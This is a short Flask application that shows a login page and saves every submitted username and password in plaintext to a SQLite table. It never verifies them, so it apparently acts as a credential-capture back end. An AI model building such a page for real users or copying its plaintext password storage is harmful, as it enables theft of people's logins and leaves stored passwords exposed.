from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__)

# Create the database table (runs only once)
def init_db():
    conn = sqlite3.connect("logins.db")
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()  # initialize DB at app start

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Save to SQLite DB
        conn = sqlite3.connect("logins.db")
        c = conn.cursor()
        c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()

        return redirect("/")  # refresh

    return render_template("index.html")

if __name__ == "__main__":
    app.run()
